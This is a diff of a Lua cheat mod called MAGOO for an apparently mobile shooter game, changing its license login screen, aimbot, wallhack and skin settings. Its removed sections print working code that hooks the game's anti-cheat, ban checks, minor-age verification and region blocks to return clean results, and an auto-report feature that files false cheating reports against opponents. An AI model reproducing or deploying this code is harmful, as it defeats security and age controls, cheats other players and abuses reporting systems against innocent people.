                             openTelegram()
                         end
                     )
@@ -3149,15 +914,38 @@ pcall(function()
                         btnY,
                         btnW,
                         btnH,
-                        "UNLOCK",
-                        0.95, 1.00, 0.98,
+                        "AUTHENTICATE",
+                        0.95, 1.00, 0.95,
                         doLogin
                     )
                     addText(root, "ENCRYPTED SESSION  ·  " .. tostring(Config.BRAND_NAME or "MAGOO"),
                         math.floor(10 * scale), GREY, cx, cy + panelH * 0.42)
                     _G._LOGIN_UI = root
                     pcall(function()
-                        if root.SetRenderOpacity then root:SetRenderOpacity(1.0) end
+                        if root.SetRenderOpacity then root:SetRenderOpacity(0.0) end
+                        local tk = nil
+                        pcall(function()
+                            if GetTicker then tk = GetTicker() end
+                            if not tk then
+                                local ok, t = pcall(require, "common.time_ticker")
+                                if ok then tk = t end
+                            end
+                        end)
+                        if tk and tk.AddTimerOnce then
+                            local steps = {0.25, 0.45, 0.65, 0.85, 1.0}
+                            for i, op in ipairs(steps) do
+                                local o = op
+                                tk.AddTimerOnce(0.05 * i, function()
+                                    pcall(function()
+                                        if root and slua.isValid(root) and root.SetRenderOpacity then
+                                            root:SetRenderOpacity(o)
+                                        end
+                                    end)
+                                end)
+                            end
+                        else
+                            if root.SetRenderOpacity then root:SetRenderOpacity(1.0) end
+                        end
                     end)
                     built = true
                 end)
@@ -3196,26 +984,18 @@ pcall(function()
                             if onSuccess then pcall(onSuccess) end
                             return
                         end
-                        print("[MAGOO] LoginUI Build attempt " .. tostring(tries))
                         if M.Build(pawn, hint or "Enter your key", onSuccess) then
-                            print("[MAGOO] LoginUI Build OK")
                             return
                         end
-                        -- client_entry is early: canvas may take long; keep trying
-                        if tries < 120 then
+                        if tries < 40 then
                             local tk = GetTicker and GetTicker() or nil
                             if not tk then
                                 local ok, t = pcall(require, "common.time_ticker")
                                 if ok then tk = t end
                             end
-                            local delay = (tries < 20) and 1.0 or 2.0
                             if tk and tk.AddTimerOnce then
-                                tk.AddTimerOnce(delay, attempt)
-                            elseif tk and tk.AddTimer then
-                                tk.AddTimer(delay, attempt)
+                                tk.AddTimerOnce(2.0, attempt)
                             end
-                        else
-                            print("[MAGOO] LoginUI Build gave up after " .. tostring(tries))
                         end
                     end
                     attempt()
@@ -3314,345 +1094,6 @@ pcall(function()
                 return M
             end)()
             _G.LoginSystem = LoginSystem
-
-            -- ============================================================
-            -- EXTERNAL BYPASS (ban_util / security / region / TSS / Lobby)
-            -- Coexists with InstallEigenBypass spoof; shared _HookRegistry
-            -- ============================================================
-            pcall(function()
-                if _G._MAGOO_EXTERNAL_BYPASS_LOADED then return end
-                _G._MAGOO_EXTERNAL_BYPASS_LOADED = true
-                local function runBypassOnce()
-                    pcall(function()
-                        _G._HookRegistry = _G._HookRegistry or {}
-                        local _HookRegistry = _G._HookRegistry
-                    
-                        local function _WhiteMagic_HOOK(tbl, key, wrapperFactory)
-                            if type(tbl) ~= "table" then return end
-                            local orig = tbl[key]
-                            if orig and _HookRegistry[orig] then return end
-                            local ok, newFn = pcall(wrapperFactory, orig)
-                            if not ok or type(newFn) ~= "function" then return end
-                            if type(orig) == "function" then
-                                _HookRegistry[newFn] = _HookRegistry[orig] or orig
-                            end
-                            tbl[key] = newFn
-                        end
-                    
-                        local m = _G.LobbySystem
-                        _WhiteMagic_HOOK(m, "SendEigeninfo", function() return function() end end)
-                    end)
-                    
-                    pcall(function()
-                        if IsGhostProcess and IsGhostProcess() then return end
-                    
-                        pcall(function()
-                            local ban_util = package.loaded["client.common.ban_util"]
-                            if not ban_util then
-                                local ok, m = pcall(require, "client.common.ban_util")
-                                if ok then ban_util = m end
-                            end
-                            if ban_util and type(ban_util.IsBanned) == "function"
-                               and not ban_util.__lbs_patched then
-                                ban_util.IsBanned = function() return false end
-                                ban_util.__lbs_patched = true
-                            end
-                        end)
-                    
-                        pcall(function()
-                            local sec = package.loaded["client.slua.logic.security.logic_security"]
-                            if not sec then
-                                local ok, m = pcall(require, "client.slua.logic.security.logic_security")
-                                if ok then sec = m end
-                            end
-                            if sec and not sec.__lbs_patched then
-                                if type(sec.CheckRiskLevel) == "function" then
-                                    sec.CheckRiskLevel = function() return 0 end
-                                end
-                                if type(sec.IsDeviceBanned) == "function" then
-                                    sec.IsDeviceBanned = function() return false end
-                                end
-                                sec.__lbs_patched = true
-                            end
-                        end)
-                    
-                        pcall(function()
-                            local mv = package.loaded["client.slua.logic.minor_verification.logic_minor_verification"]
-                            if not mv then
-                                local ok, m = pcall(require, "client.slua.logic.minor_verification.logic_minor_verification")
-                                if ok then mv = m end
-                            end
-                            if mv and not mv.__lbs_patched then
-                                if type(mv.IsEnableMinorVerification) == "function" then
-                                    mv.IsEnableMinorVerification = function() return false end
-                                end
-                                if type(mv.IsVerificationFinished) == "function" then
-                                    mv.IsVerificationFinished = function() return true end
-                                end
-                                if type(mv.BeginVerificationFlow) == "function" then
-                                    mv.BeginVerificationFlow = function(nextStep)
-                                        if type(nextStep) == "function" then pcall(nextStep) end
-                                    end
-                                end
-                                mv.__lbs_patched = true
-                            end
-                        end)
-                    
-                        pcall(function()
-                            local rb = package.loaded["client.logic.logic_region_block.logic_region_block"]
-                            if not rb then
-                                local ok, m = pcall(require, "client.logic.logic_region_block.logic_region_block")
-                                if ok then rb = m end
-                            end
-                            if rb and not rb.__lbs_patched then
-                                if type(rb.IsCrossRegionPlayer) == "function" then
-                                    rb.IsCrossRegionPlayer = function() return false end
-                                end
-                                if type(rb.GetBlockType) == "function" then
-                                    rb.GetBlockType = function() return nil, nil end
-                                end
-                                if type(rb.ShowBlockRegionNotice) == "function" then
-                                    rb.ShowBlockRegionNotice = function() end
-                                end
-                                if type(rb.ShowCrossRegionRechargeNotify) == "function" then
-                                    rb.ShowCrossRegionRechargeNotify = function(cb)
-                                        if type(cb) == "function" then pcall(cb) end
-                                    end
-                                end
-                                rb.__lbs_patched = true
-                            end
-                        end)
-                    
-                        pcall(function()
-                            if not _G.LobbySystem then return end
-                            if type(LobbySystem.on_sync_base_info) == "function"
-                               and not LobbySystem.__lbs_sync_patched then
-                                local orig_sync = LobbySystem.on_sync_base_info
-                                LobbySystem.on_sync_base_info = function(roleData, ...)
-                                    if type(roleData) == "table" then
-                                        roleData.is_banned        = nil
-                                        roleData.ban_type         = nil
-                                        roleData.ban_end_time     = nil
-                                        roleData.account_status   = nil
-                                        roleData.risk_level       = nil
-                                        if type(roleData.ban) == "table" then
-                                            for _, info in pairs(roleData.ban) do
-                                                if type(info) == "table" then
-                                                    info.end_time = 0
-                                                end
-                                            end
-                                        end
-                                    end
-                                    return orig_sync(roleData, ...)
-                                end
-                                LobbySystem.__lbs_sync_patched = true
-                            end
-                        end)
-                    end)
-                    
-                    -- ============================================================
-                    --  BYPASS V1
-                    -- ============================================================
-                    pcall(function()
-                        if _G.__bypass_v10_loaded then return end
-                        _G.__bypass_v10_loaded = true
-                    
-                        pcall(function()
-                            local _Tss = _G.Tss or _G.TssManager
-                            if _Tss then
-                                if type(_Tss.EigenArrayObfuscationVerify) == "function" then
-                                    _Tss.EigenArrayObfuscationVerify = function(...) return true end
-                                end
-                                if type(_Tss.GetUserTag4Lua) == "function" then
-                                    _Tss.GetUserTag4Lua = function() return "00000000000000000000000000000000" end
-                                end
-                            end
-                        end)
-                    
-                        pcall(function()
-                            local GokubaLogic = package.loaded["GameLua.Mod.BaseMod.Client.Security.Gokuba"]
-                            if not GokubaLogic then
-                                local ok, m = pcall(require, "GameLua.Mod.BaseMod.Client.Security.Gokuba")
-                                if ok then GokubaLogic = m end
-                            end
-                            if GokubaLogic and type(GokubaLogic.ForwardFeature) == "function" then
-                                GokubaLogic.ForwardFeature = function()
-                                    if NetUtil and type(NetUtil.SendPkg) == "function" then
-                                        NetUtil.SendPkg("battle_client_sync_allstar_auth_check_result_req", {0, 0, 0, 0, 0})
-                                    end
-                                end
-                            end
-                        end)
-                    end)
-                    
-                end
-                pcall(runBypassOnce)
-                -- late modules: retry
-                pcall(function()
-                    local tk = GetTicker and GetTicker() or nil
-                    if not tk then
-                        local ok, t = pcall(require, "common.time_ticker")
-                        if ok then tk = t end
-                    end
-                    if tk and tk.AddTimerOnce then
-                        for _, d in ipairs({2, 5, 10, 20, 40}) do
-                            tk.AddTimerOnce(d, function()
-                                _G._MAGOO_EXTERNAL_BYPASS_LOADED = false
-                                -- allow re-entry only for module patches that use __lbs_patched guards
-                                pcall(runBypassOnce)
-                                _G._MAGOO_EXTERNAL_BYPASS_LOADED = true
-                            end)
-                        end
-                    end
-                end)
-            end)
-
-
-            -- ============================================================
-            -- WhiteMagic SendEigeninfo bypass (spoof, not mute)
-            -- Intercepts eigen/security payloads and clears ban flags
-            -- before the original handler sees them. Safe for other RPCs.
-            -- ============================================================
-            pcall(function()
-                _G._HookRegistry = _G._HookRegistry or {}
-                local function _WhiteMagic_HOOK(tbl, key, wrapperFactory)
-                    if type(tbl) ~= "table" then return end
-                    local orig = tbl[key]
-                    if type(orig) == "function" and _G._HookRegistry[orig] then
-                        return
-                    end
-                    if type(orig) ~= "function" and orig ~= nil then
-                        return
-                    end
-                    local newFn = wrapperFactory(orig)
-                    if type(newFn) ~= "function" then return end
-                    if type(orig) == "function" then
-                        _G._HookRegistry[newFn] = _G._HookRegistry[orig] or orig
-                    end
-                    tbl[key] = newFn
-                end
-
-                local function _SpoofEigenPayload(data)
-                    if type(data) == "table" then
-                        if data.ban ~= nil then data.ban = false end
-                        if data.banned ~= nil then data.banned = false end
-                        if data.is_banned ~= nil then data.is_banned = false end
-                        if data.Ban ~= nil then data.Ban = false end
-                        if data.IsBan ~= nil then data.IsBan = false end
-                        if data.isBan ~= nil then data.isBan = false end
-                        if data.ban_time ~= nil then data.ban_time = 0 end
-                        if data.banTime ~= nil then data.banTime = 0 end
-                        if data.BanTime ~= nil then data.BanTime = 0 end
-                        if data.ban_reason ~= nil then data.ban_reason = "" end
-                        if data.banReason ~= nil then data.banReason = "" end
-                        if data.can_access ~= nil then data.can_access = true end
-                        if data.permission ~= nil then data.permission = 1 end
-                        if data.allowed ~= nil then data.allowed = true end
-                        if data.status ~= nil and (data.status == "banned" or data.status == "ban") then
-                            data.status = "ok"
-                        end
-                        -- shallow pass nested tables commonly used in responses
-                        for k, v in pairs(data) do
-                            if type(v) == "table" then
-                                pcall(_SpoofEigenPayload, v)
-                            end
-                        end
-                    elseif type(data) == "string" then
-                        data = data:gsub('"ban"%s*:%s*true', '"ban":false')
-                        data = data:gsub('"banned"%s*:%s*true', '"banned":false')
-                        data = data:gsub('"is_banned"%s*:%s*true', '"is_banned":false')
-                        data = data:gsub('"Ban"%s*:%s*true', '"Ban":false')
-                        data = data:gsub('"can_access"%s*:%s*false', '"can_access":true')
-                        data = data:gsub('"allowed"%s*:%s*false', '"allowed":true')
-                    end
-                    return data
-                end
-
-                local function _WrapSendEigeninfo(orig)
-                    return function(self, data, ...)
-                        data = _SpoofEigenPayload(data)
-                        if type(orig) == "function" then
-                            return orig(self, data, ...)
-                        end
-                    end
-                end
-
-                local function _TryHookTable(m, tag)
-                    if type(m) ~= "table" then return false end
-                    if type(m.SendEigeninfo) ~= "function" then return false end
-                    if _G._HookRegistry[m.SendEigeninfo] then return true end
-                    _WhiteMagic_HOOK(m, "SendEigeninfo", _WrapSendEigeninfo)
-                    print("[MAGOO] SendEigeninfo hooked via " .. tostring(tag))
-                    return true
-                end
-
-                local function InstallEigenBypass()
-                    if _G._MAGOO_EIGEN_HOOKED then return end
-                    local hooked = false
-                    -- package.loaded sweep
-                    pcall(function()
-                        if not package or not package.loaded then return end
-                        for name, mod in pairs(package.loaded) do
-                            if _TryHookTable(mod, name) then
-                                hooked = true
-                            end
-                            -- nested .protocol / .Protocol tables
-                            if type(mod) == "table" then
-                                for _, sub in pairs(mod) do
-                                    if type(sub) == "table" and _TryHookTable(sub, tostring(name) .. ".sub") then
-                                        hooked = true
-                                    end
-                                end
-                            end
-                        end
-                    end)
-                    -- common globals
-                    pcall(function()
-                        for _, gname in ipairs({
-                            "Net", "NetUtil", "Tss", "Client", "SecurityModule",
-                            "AntiCheat", "ACModule", "EigenModule"
-                        }) do
-                            local g = _G[gname]
-                            if _TryHookTable(g, gname) then hooked = true end
-                        end
-                    end)
-                    if hooked then
-                        _G._MAGOO_EIGEN_HOOKED = true
-                    end
-                    return hooked
-                end
-
-                _G._MAGOO_InstallEigenBypass = InstallEigenBypass
-                InstallEigenBypass()
-                -- retry a few times as modules load late
-                pcall(function()
-                    local tk = GetTicker and GetTicker() or nil
-                    if not tk then
-                        local ok, t = pcall(require, "common.time_ticker")
-                        if ok then tk = t end
-                    end
-                    if tk and tk.AddTimerOnce then
-                        for _, d in ipairs({3, 8, 15, 30, 60}) do
-                            tk.AddTimerOnce(d, function()
-                                pcall(InstallEigenBypass)
-                            end)
-                        end
-                    end
-                end)
-            end)
-
-                        _G.LexusConfig = _G.LexusConfig or {}
-            _G.LexusConfig.ModSkin = false
-            _G.LexusConfig.SkinDeadBox = false
-            _G.LexusConfig.KillMessage = _G.LexusConfig.KillMessage or false
-            _G.LexusConfig.KillCountUI = _G.LexusConfig.KillCountUI or false
-            if _G.GTLMODConfig then
-                _G.GTLMODConfig.ModSkin = false
-                _G.GTLMODConfig.SkinDeadBox = false
-                _G.GTLMODConfig.SkinPet = false
-                _G.GTLMODConfig.SkinXSuit = false
-            end
-
             function _G.LoginSystem_OnRevoked(errCode)
                 _G._LICENSE_OK  = false
                 _G._MOD_EXPIRED = true
@@ -3671,7 +1112,7 @@ pcall(function()
                     end
                 end)
                 pcall(function() if _G.StopEnemyCounter then _G.StopEnemyCounter() end end)
-                
+                pcall(function() if _G._GK_FeedbackStarted then _G._GK_FeedbackStarted = false end end)
             end
             local function ShowMagooVerifiedPopup()
                 if _G._MAGOO_VERIFIED_SHOWN then return end
@@ -3959,15 +1400,25 @@ pcall(function()
                 end
                 return _cached_ui_util
             end
+            local _humanAimJitter = { lastApply = 0, phase = 0 }
             local function HumanAimDelta(dx, dy, fraction)
-                -- pure fraction scaling; no additive jitter (smoothness slider owns the curve)
-                return dx * fraction, dy * fraction
+                local now = os.clock()
+                local dt = now - _humanAimJitter.lastApply
+                _humanAimJitter.lastApply = now
+                _humanAimJitter.phase = _humanAimJitter.phase + dt * 5.0
+                local jitterAmp = 0.08
+                local jx = math.sin(_humanAimJitter.phase * 1.7) * jitterAmp * 0.6
+                local jy = math.cos(_humanAimJitter.phase * 2.1) * jitterAmp * 0.6
+                return dx * fraction + jx, dy * fraction + jy
             end
             local function PrivAimbotTick()
                 local cfg = _G.GTLMODConfig or {}
-                local hipOn = cfg.ForceAimbot == true or cfg.ForceAimbot == 1 or cfg.ForceAimbot == "true"
-                    or _G._ForceAimbotWanted == true
+                local hipOn = cfg.ForceAimbot == true
                 if not hipOn then return end
+                -- Sensible defaults for filters (UI removed; keep aimbot usable)
+                if cfg.AimTouchIgKnock == nil then cfg.AimTouchIgKnock = true end
+                if cfg.AimTouchIgBot == nil then cfg.AimTouchIgBot = true end
+                if cfg.AimTouchVisCheck == nil then cfg.AimTouchVisCheck = true end
                 local player = nil
                 pcall(function() player = GameplayData.GetPlayerCharacter() end)
                 if not (player and slua.isValid(player)) then return end
@@ -4051,24 +1502,12 @@ pcall(function()
                 if not viewportSize then return end
                 local centerX = viewportSize.X * 0.5
                 local centerY = viewportSize.Y * 0.5
-                local FOV_RADIUS = 0.42 * (viewportSize.X / 2.0)
-                local boneMap = {
-                    [1] = "head",
-                    [2] = "spine_02",
-                    [3] = "spine_01",
-                    [4] = "pelvis",
-                }
+                local FOV_RADIUS = 0.30 * (viewportSize.X / 2.0)
+                local BONE_MAP = { [1] = "head", [2] = "spine_03", [3] = "spine_01", [4] = "pelvis" }
                 local boneIdx = tonumber(cfg.AimbotBone) or 1
                 if boneIdx < 1 then boneIdx = 1 end
                 if boneIdx > 4 then boneIdx = 4 end
-                local TARGET_BONE = boneMap[boneIdx] or "spine_02"
-                local isADS = false
-                pcall(function()
-                    if player.bIsGunADS or player.bIsADS or player.bInADS then isADS = true end
-                    if type(player.IsGunADS) == "function" and player:IsGunADS() then isADS = true end
-                    if type(player.GetIsADS) == "function" and player:GetIsADS() then isADS = true end
-                end)
-                -- keep selected bone in both hip and ADS; do not override to chest
+                local TARGET_BONE = BONE_MAP[boneIdx] or "head"
                 local bestTarget = nil
                 local bestScore  = 99999999
                 local now = os.clock()
@@ -4082,7 +1521,7 @@ pcall(function()
                     _G._PrivAimCacheLastFlush = _cacheNow
                 end
                 local maxAimScan = (LIMITS and LIMITS.MAX_ENEMY_MARKS) or 40
-                if maxAimScan > 20 then maxAimScan = 20 end
+                if maxAimScan > 16 then maxAimScan = 16 end
                 local scanned = 0
                 for _, actor in pairs(allChars) do
                     scanned = scanned + 1
@@ -4127,7 +1566,7 @@ pcall(function()
                         end
                         if cfg.AimTouchIgBot == true and isBot then goto priv_continue end
                         local vcache = _G.PrivAimVisCache[actorKey]
-                        if not vcache or (now - vcache.t) > 0.22 then
+                        if not vcache or (now - vcache.t) > 0.12 then
                             local hidden = false
                             local losOk = false
                             pcall(function()
@@ -4201,14 +1640,14 @@ pcall(function()
                 if deltaYaw   < -180 then deltaYaw   = deltaYaw   + 360 end
                 if deltaPitch >  180 then deltaPitch = deltaPitch - 360 end
                 if deltaPitch < -180 then deltaPitch = deltaPitch + 360 end
-                local _smoothVal = tonumber(_G.GTLMODConfig.AimbotSmoothness) or 25
-                if _smoothVal < 1 then _smoothVal = 1 end
-                if _smoothVal > 100 then _smoothVal = 100 end
-                -- restore strong lock: low smoothness = near-instant, high = gentle
-                -- default 25 is close and responsive like original
-                local fraction = 1.0 - (_smoothVal / 120.0)
-                if fraction < 0.35 then fraction = 0.35 end
-                if fraction > 0.95 then fraction = 0.95 end
+                local _smoothVal = tonumber(_G.GTLMODConfig.AimbotSmoothness) or 45
+                -- Higher value = smoother/slower aim (less aggressive). Range 10-90 from menu.
+                local _smoothClamped = math.max(10, math.min(90, _smoothVal))
+                local maximum = ((_smoothClamped - 1) / 99.0) * (200 - 5) + 5
+                local _delta = 0.016
+                maximum = maximum * math.min(_delta, 0.05)
+                local distance = math.sqrt(deltaYaw*deltaYaw + deltaPitch*deltaPitch)
+                local fraction = (distance > maximum) and (maximum/distance) or 1.0
                 local humanDY, humanDP = HumanAimDelta(deltaYaw, deltaPitch, fraction)
                 local adsBias = 0
                 pcall(function()
@@ -4268,10 +1707,10 @@ pcall(function()
                 AimTouchEnable = false,
                 AimTouchIgKnock = false,
                 AimTouchIgBot = false,
-                AimTouchVisCheck = false, -- user toggle; LOS used when true
+                AimTouchVisCheck = false,
                 ForceAimbot = false,
                 AimbotBone = 1,
-                AimbotSmoothness = 25,
+                AimbotSmoothness = 45,
                 BlackSky = false,
                 EspLoot = false,
                 LootShowM416 = false, LootShowAUG = false, LootShowAKM = false, LootShowM24 = false,
@@ -4284,16 +1723,19 @@ pcall(function()
                 VehicleShowDacia = true, VehicleShowUAZ = true, VehicleShowBuggy = true,
                 VehicleShowCoupe = true, VehicleShowMirado = true, VehicleShowMotorcycle = true,
                 VehicleShowOther = true,
+                SkinDeadBox = false, SkinPet = false, SkinXSuit = false,
+                ModSkin = false,
+                SkinSuit = 1,
+                SkinBag = 1,
+                SkinHelmet = 1,
+                SkinGloves = 0,
+                SkinGlider = 0,
+                SkinParachute = 0,
                 PrivSmallCrosshair = false, ForceAimbotScope = false,
                 CounterEnabled = false,
                 EspLine = false,
                 AimDebug = false,
                 WallhackSmart = false,
-                AutoReport = false,
-                AutoReportDual = false,
-                AutoReportReason = 1,
-                AutoReportDelay = 3.0,
-                ForceTPP = false,
                 EspLineThickness = 2,
                 EspItem_Master = false,
                 EspItem_AR = true,
@@ -4313,8 +1755,6 @@ pcall(function()
                 EspTeamColorBox = false,
                 EspWeaponIcon = false,
                 EspActiveBom = false,
-                WorldRain = false,
-                WorldSnow = false,
                 ForceAimbotScope = false,
                 LagFreeMode = false,
                 WallhackThickness = 2.5,
@@ -4405,15 +1845,6 @@ pcall(function()
             end
             if not _G.ModConfigLoaded then
                 local hadSaved = _G.LoadModSettings()
-                pcall(function()
-                    if _G.GTLMODConfig then _G.GTLMODConfig.PrivSmallCrosshair = false end
-                    if _G.PrivWeaponInstance then
-                        pcall(function()
-                            if _G.PrivWeaponInstance.dispose then _G.PrivWeaponInstance:dispose() end
-                        end)
-                        _G.PrivWeaponInstance = nil
-                    end
-                end)
                 if not hadSaved then
                     local c = _G.GTLMODConfig
                     if c then
@@ -4469,17 +1900,8 @@ pcall(function()
                 if _G.GTLMODConfig and _G.GTLMODConfig.ForceAimbot == true then
                     _G._ForceAimbotWanted = true
                 end
-                -- keep wallhack colors consistent after load
-                if _G.GTLMODConfig and _G.GTLMODConfig.WallhackSmart and _G.RefreshWallhackColors then
-                    pcall(_G.RefreshWallhackColors)
-                end
                 AutoSaveLoop()
                 _G.ModConfigLoaded = true
-                if _G.GTLMODConfig and _G.GTLMODConfig.EspActiveBom == true and _G.MagooGrenadeSetEnabled then
-                    pcall(_G.MagooGrenadeSetEnabled, true)
-                end
-                if _G.GTLMODConfig and _G.GTLMODConfig.WorldRain and _G.ApplyWorldRain then pcall(_G.ApplyWorldRain, true) end
-                if _G.GTLMODConfig and _G.GTLMODConfig.WorldSnow and _G.ApplyWorldSnow then pcall(_G.ApplyWorldSnow, true) end
             end
             local NewWallhack = {
                 Active = false,
@@ -4487,9 +1909,9 @@ pcall(function()
                 PROCESSED_PAWNS = {},
                 TICK_COUNT = 0,
                 CONSOLE_READY = false,
-                TICK_INTERVAL = 1.20,
-                MAX_PAWNS_PER_TICK = 24,
-                RESET_PROCESSED_EVERY = 2,
+                TICK_INTERVAL = 2.80,
+                MAX_PAWNS_PER_TICK = 6,
+                RESET_PROCESSED_EVERY = 4,
                 AVATAR_SLOTS = {0,1,2,3,4,5,6,7},
                 colors = { vis = nil, occ = nil, bVis = nil, bOcc = nil }
             }
@@ -4517,15 +1939,20 @@ pcall(function()
             local function ApplyToMesh(mesh, visColor, occColor)
                 if not mesh or not slua.isValid(mesh) then return end
                 pcall(function()
+                    -- Dyeing path (primary for visible vs occluded)
                     if mesh.SetDrawDyeing then mesh:SetDrawDyeing(true) end
                     if mesh.SetDrawDyeingMode then mesh:SetDrawDyeingMode(1) end
                     if mesh.SetVisibleDyeingColor then mesh:SetVisibleDyeingColor(visColor) end
                     if mesh.SetOccludedDyeingColor then mesh:SetOccludedDyeingColor(occColor) end
                     if mesh.SetDyeingColorFadeDistance then mesh:SetDyeingColorFadeDistance(99999.0) end
                     if mesh.SetDyeingColorMinMaxDistance then mesh:SetDyeingColorMinMaxDistance(0.0, 99999.0) end
+                    -- Highlight path: allow occlusion so occ color can show
                     if mesh.SetDrawHighlight then mesh:SetDrawHighlight(true) end
                     if mesh.OverrideHighlightColor then mesh:OverrideHighlightColor(visColor) end
-                    if mesh.SetHighlightCanBeOccluded then mesh:SetHighlightCanBeOccluded(false) end
+                    if mesh.SetHighlightCanBeOccluded then mesh:SetHighlightCanBeOccluded(true) end
+                    if mesh.OverrideHighlightOcclusionColor then mesh:OverrideHighlightOcclusionColor(occColor) end
+                    if mesh.SetOccludedHighlightColor then mesh:SetOccludedHighlightColor(occColor) end
+                    -- IdeaOutline path: distinct vis / occ colors
                     if mesh.SetDrawIdeaOutline then mesh:SetDrawIdeaOutline(true) end
                     if mesh.SetIdeaOutlineNew then mesh:SetIdeaOutlineNew(true) end
                     if mesh.SetIdeaOutlineOcclusionHighlight then mesh:SetIdeaOutlineOcclusionHighlight(true) end
@@ -4565,56 +1992,15 @@ pcall(function()
                         NewWallhack.PROCESSED_PAWNS = {}
                     end
                     local myTeamId = localPawn.TeamID or 0
-                    local allPawns = {}
-                    pcall(function()
-                        local gp = Game and Game.GetAllPlayerPawns and Game:GetAllPlayerPawns()
-                        if type(gp) == "table" then
-                            for _, p in pairs(gp) do allPawns[#allPawns+1] = p end
-                        elseif gp and gp.Num then
-                            for i = 0, gp:Num()-1 do
-                                local p = gp:Get(i)
-                                if p then allPawns[#allPawns+1] = p end
-                            end
-                        end
-                    end)
-                    pcall(function()
-                        if GameplayData and GameplayData.GetAllCharacters then
-                            local ac = GameplayData.GetAllCharacters()
-                            if type(ac) == "table" then
-                                for _, p in pairs(ac) do
-                                    if p then allPawns[#allPawns+1] = p end
-                                end
-                            end
-                        end
-                    end)
+                    local allPawns = Game:GetAllPlayerPawns() or {}
                     local processedCount = 0
-                    local seenKeys = {}
-                    for _, pawn in ipairs(allPawns) do
+                    for _, pawn in pairs(allPawns) do
                         if processedCount >= NewWallhack.MAX_PAWNS_PER_TICK then break end
                         if not slua.isValid(pawn) or pawn == localPawn then goto continue end
-                        local pk = pawn.PlayerKey
-                        if pk then
-                            if seenKeys[pk] then goto continue end
-                            seenKeys[pk] = true
-                            if NewWallhack.PROCESSED_PAWNS[pk] then goto continue end
-                        end
-                        if not IsPawnAlive(pawn) then goto continue end
-                        local teamOk = true
-                        pcall(function()
-                            if pawn.TeamID and myTeamId and pawn.TeamID == myTeamId then teamOk = false end
-                        end)
-                        if not teamOk then goto continue end
-                        do
-                            local isAI = false
-                            pcall(function()
-                                if Game and Game.IsAI then isAI = Game.IsAI(pawn) == true end
-                            end)
-                            if not isAI then
-                                pcall(function()
-                                    if pawn.bEnsure then isAI = true end
-                                    if pawn.IsAI and pawn:IsAI() then isAI = true end
-                                end)
-                            end
+                        if pawn.PlayerKey and NewWallhack.PROCESSED_PAWNS[pawn.PlayerKey] then goto continue end
+                        if not slua.isValid(pawn) then goto continue end
+                        if IsPawnAlive(pawn) and pawn.TeamID and pawn.TeamID ~= myTeamId then
+                            local isAI = pcall(Game.IsAI, pawn) and true or false
                             local vis = isAI and NewWallhack.colors.bVis or NewWallhack.colors.vis
                             local occ = isAI and NewWallhack.colors.bOcc or NewWallhack.colors.occ
                             pcall(function()
@@ -4765,202 +2151,6 @@ pcall(function()
                 NewWallhack.PROCESSED_PAWNS = {}
                 NewWallhack.Active = false
             end
-
-            -- ========== AUTO REPORT (DANGER) — from SERVER newesp P40.Report* ==========
-            _G.AutoReportConfig = _G.AutoReportConfig or {
-                Enable = false, ReportReason = 1, ReportDelay = 3.0,
-                _lastReportTime = 0, _reportedPlayers = {}, _reportQueue = {},
-                _cachedReportModule = nil,
-            }
-            _G.AutoReportReasons = _G.AutoReportReasons or {
-                [1] = "Cheating", [2] = "Team up", [3] = "Abuse", [4] = "Name", [5] = "Other",
-            }
-            local function MagooReportNow()
-                return (os.clock and os.clock()) or 0
-            end
-            local function MagooReportPlayer(tp)
-                local cfg = _G.AutoReportConfig
-                if not (cfg and cfg.Enable) then return end
-                if not tp then return end
-                if not (slua and slua.isValid and slua.isValid(tp)) then return end
-                local alive = true
-                pcall(function()
-                    if tp.IsAlive then alive = tp:IsAlive() and true or false end
-                    if tp.Health ~= nil and tonumber(tp.Health) and tonumber(tp.Health) <= 0 then alive = false end
-                end)
-                if not alive then return end
-                local me = nil
-                pcall(function()
-                    if GameplayData and GameplayData.GetPlayerCharacter then
-                        me = GameplayData.GetPlayerCharacter()
-                    end
-                end)
-                if me and slua.isValid(me) and tp == me then return end
-                local mate = false
-                pcall(function()
-                    local a, b = nil, nil
-                    if me then
-                        if me.GetTeamID then a = me:GetTeamID() else a = me.TeamID end
-                    end
-                    if tp.GetTeamID then b = tp:GetTeamID() else b = tp.TeamID end
-                    if a ~= nil and b ~= nil and a == b then mate = true end
-                end)
-                if mate then return end
-                local key = nil
-                pcall(function()
-                    if tp.GetPlayerKey then key = tp:GetPlayerKey() end
-                    if key == nil then key = tp.PlayerKey end
-                end)
-                if key == nil then return end
-                key = tostring(key)
-                if cfg._reportedPlayers[key] then return end
-                local nm = nil
-                pcall(function()
-                    if tp.GetPlayerNameSafety then nm = tp:GetPlayerNameSafety() end
-                end)
-                if not nm or nm == "" then
-                    pcall(function() nm = tp.PlayerName end)
-                end
-                local rs = (_G.AutoReportReasons or {})[tonumber(cfg.ReportReason) or 1] or "Cheating"
-                cfg._reportedPlayers[key] = true
-                cfg._reportQueue[#cfg._reportQueue + 1] = { key = key, reason = rs, name = tostring(nm or "") }
-            end
-            local function MagooReportProcessQueue()
-                local cfg = _G.AutoReportConfig
-                if not cfg then return end
-                local q = cfg._reportQueue
-                if not q or #q == 0 then return end
-                local gap = math.max(0.5, tonumber(cfg.ReportDelay) or 3.0)
-                if (MagooReportNow() - (cfg._lastReportTime or 0)) < gap then return end
-                local entry = table.remove(q, 1)
-                if not entry then return end
-                local okCall, errMsg = pcall(function()
-                    if not cfg._cachedReportModule then
-                        local ok, mod = pcall(require, "GameLua.Mod.BaseMod.Client.Security.ClientReportPlayerSubsystem")
-                        if ok and mod then cfg._cachedReportModule = mod end
-                    end
-                    local mod = cfg._cachedReportModule
-                    if not mod or not mod.ReportPlayer then
-                        error("no ClientReportPlayerSubsystem")
-                    end
-                    mod:ReportPlayer(entry.key, entry.reason)
-                end)
-                cfg._lastReportTime = MagooReportNow()
-                if okCall then
-                    _G._MagooLastReport = {
-                        ok = true,
-                        reason = tostring(entry.reason or ""),
-                        name = tostring(entry.name or ""),
-                        key = tostring(entry.key or ""),
-                        t = os.time(),
-                    }
-                else
-                    _G._MagooLastReport = {
-                        ok = false,
-                        reason = tostring(errMsg or "fail"),
-                        name = tostring(entry.name or ""),
-                        key = tostring(entry.key or ""),
-                        t = os.time(),
-                    }
-                end
-            end
-            local function MagooReportTick()
-                local cfg = _G.AutoReportConfig
-                if not cfg then return end
-                -- per-match: clear last-report + reported set when match identity changes
-                pcall(function()
-                    local mid = nil
-                    if GameplayData and GameplayData.GetGameState then
-                        local gs = GameplayData.GetGameState()
-                        if gs then
-                            mid = gs.GameID or gs.MatchId or gs.UID or gs.GameModeID
